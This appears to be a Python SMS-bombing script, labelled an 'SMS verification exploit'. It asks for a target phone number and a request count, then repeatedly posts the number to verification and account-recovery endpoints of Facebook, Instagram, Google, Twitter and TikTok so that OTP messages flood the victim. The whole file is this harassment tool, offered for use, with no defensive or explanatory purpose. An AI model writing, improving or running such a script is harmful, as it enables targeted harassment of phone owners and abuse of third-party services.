import requests, time

DESCRIPTION = "SMS verification exploit (multi-platform)"

R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
N = "\033[0m"

SERVICES = {
    "Facebook": "https://www.facebook.com/ajax/login/help/identify.php?ctx=recover",
    "Instagram": "https://www.instagram.com/api/v1/accounts/send_signup_verification_sms/",
    "Google": "https://accounts.google.com/signin/v2/lookup",
    "Twitter": "https://api.twitter.com/1.1/account/send_verification_code.json",
    "TikTok": "https://www.tiktok.com/passport/email/send_code/",
}

def run():
    phone = input(f"{Y}[?] Target phone number (62xxx): {N}")
    count = int(input(f"{Y}[?] How many requests per service: {N}"))
    
    for name, url in SERVICES.items():
        print(f"{G}[*] Sending OTP via {name}...{N}")
        for i in range(count):
            try:
                # Simulasi request (header perlu disesuaikan)
                headers = {"User-Agent": "Mozilla/5.0"}
                data = {"phone": phone}
                r = requests.post(url, data=data, headers=headers, timeout=5)
                print(f"  [+] Request {i+1} sent. Status: {r.status_code}")
            except:
                print(f"  {R}[!] Failed{N}")
            time.sleep(1)
    print(f"{G}[*] Done.{N}")
